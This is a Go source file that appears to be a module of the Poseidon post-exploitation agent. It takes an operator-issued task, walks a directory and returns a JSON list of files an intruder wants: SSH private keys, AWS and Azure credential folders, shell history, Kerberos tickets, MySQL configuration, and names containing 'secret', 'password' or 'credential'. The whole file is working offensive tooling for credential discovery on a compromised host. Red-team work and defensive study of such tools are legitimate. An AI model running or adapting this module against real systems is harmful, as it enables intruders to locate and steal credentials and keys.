package triagedirectory

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type OSFile struct {
	Path             string `json:"path"`
	Name             string `json:"name"`
	Size             int64  `json:"size"`
	Mode             string `json:"mode"`
	ModificationTime string `json:"modification_time"`
	IsDir            bool   `json:"is_dir"`
}

type DirectoryTriageResult struct {
	AzureFiles       []OSFile `json:"azure_files"`
	AWSFiles         []OSFile `json:"aws_files"`
	SSHFiles         []OSFile `json:"ssh_files"`
	HistoryFiles     []OSFile `json:"history_files"`
	LogFiles         []OSFile `json:"log_files"`
	ShellScriptFiles []OSFile `json:"shellscript_files"`
	YAMLFiles        []OSFile `json:"yaml_files"`
	ConfFiles        []OSFile `json:"conf_files"`
	CSVFiles         []OSFile `json:"csv_files"`
	DatabaseFiles    []OSFile `json:"db_files"`
	MySqlConfFiles   []OSFile `json:"mysql_confs"`
	KerberosFiles    []OSFile `json:"kerberos_tickets"`
	InterestingFiles []OSFile `json:"interesting_files"`
}

func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}

	// do whatever here
	tMsg.TaskItem = task
	// log.Println("Task params:", string(task.Params))

	// log.Println("Parsed task params!")
	if len(task.Params) == 0 {
		tMsg.TaskResult = []byte("Error: No path given.")
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	results, err := triageDirectory(task.Params)
	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
	} else {
		data, err := json.MarshalIndent(results, "", "    ")
		// fmt.Println("Data:", string(data))
		if err != nil {
			tMsg.TaskResult = []byte(err.Error())
			tMsg.Error = true
		} else {
			tMsg.TaskResult = data
			tMsg.Error = false
		}
	}
	threadChannel <- tMsg
}

func newOSFile(path string, info os.FileInfo) OSFile {
	return OSFile{
		Path:             path,
		Name:             info.Name(),
		Size:             info.Size(),
		Mode:             info.Mode().Perm().String(),
		ModificationTime: info.ModTime().String(),
		IsDir:            info.IsDir(),
	}
}

// Helper function to add an OS file to a slice of OS Files.
func addFileToSlice(slice *[]OSFile, path string, info os.FileInfo) {
	*slice = append(*slice, newOSFile(path, info))
}

func anySliceInString(s string, slice []string) bool {
	for _, x := range slice {
		if strings.Contains(s, x) {
			return true
		}
	}
	return false
}

var interestingNames = []string{"secret", "password", "credential"}

// Triage a specified home-path for interesting files, including:
// See: FileTriageResult
func triageDirectory(triagePath string) (DirectoryTriageResult, error) {
	result := DirectoryTriageResult{}
	if _, err := os.Stat(triagePath); os.IsNotExist(err) {
		return result, err
	}

	_ = filepath.Walk(triagePath, func(path string, info os.FileInfo, err error) error {
		// Add all private keys discovered.
		if err != nil {
			return nil
		}
		if !info.IsDir() {
			if strings.Contains(path, "/.ssh/") {
				switch info.Name() {
				case "authorized_keys":
					break
				case "known_hosts":
					break
				default:
					addFileToSlice(&result.SSHFiles, path, info)
					break
				}
				// Add any file within the AWS directory.
			} else if strings.Contains(path, "/.aws/") {
				addFileToSlice(&result.AWSFiles, path, info)
				// Add all history files.
			} else if strings.HasSuffix(info.Name(), "_history") && strings.HasPrefix(info.Name(), ".") {
				addFileToSlice(&result.HistoryFiles, path, info)
				// Add all shell-script files.
			} else if strings.HasSuffix(info.Name(), ".sh") {
				addFileToSlice(&result.ShellScriptFiles, path, info)
				// Add all yaml files.
			} else if strings.HasSuffix(info.Name(), ".yml") || strings.HasSuffix(info.Name(), ".yaml") {
				addFileToSlice(&result.YAMLFiles, path, info)
				// Add all configuration files.
			} else if strings.HasSuffix(info.Name(), ".conf") {
				addFileToSlice(&result.ConfFiles, path, info)
				// Any "interesting" file names.
			} else if anySliceInString(info.Name(), interestingNames) {
				addFileToSlice(&result.InterestingFiles, path, info)
				// Any kerberos files.
			} else if strings.HasPrefix(info.Name(), "krb5") {
				addFileToSlice(&result.KerberosFiles, path, info)
				// Any MySQL configuration files.
			} else if info.Name() == ".my.cnf" || info.Name() == "my.cnf" {
				addFileToSlice(&result.MySqlConfFiles, path, info)
				// Any azure files
			} else if strings.Contains(path, "/.azure/") {
				addFileToSlice(&result.AzureFiles, path, info)
			} else if strings.HasSuffix(info.Name(), ".log") {
				addFileToSlice(&result.LogFiles, path, info)
			} else if strings.HasSuffix(info.Name(), ".csv") || strings.HasSuffix(info.Name(), ".tsv") {
				addFileToSlice(&result.CSVFiles, path, info)
			} else if strings.HasSuffix(info.Name(), ".db") {
				addFileToSlice(&result.DatabaseFiles, path, info)
			}
		} else {
			// Any directories that look interesting.
			if anySliceInString(info.Name(), interestingNames) {
				addFileToSlice(&result.InterestingFiles, path, info)
			}
		}
		return nil
	})

	return result, nil
}
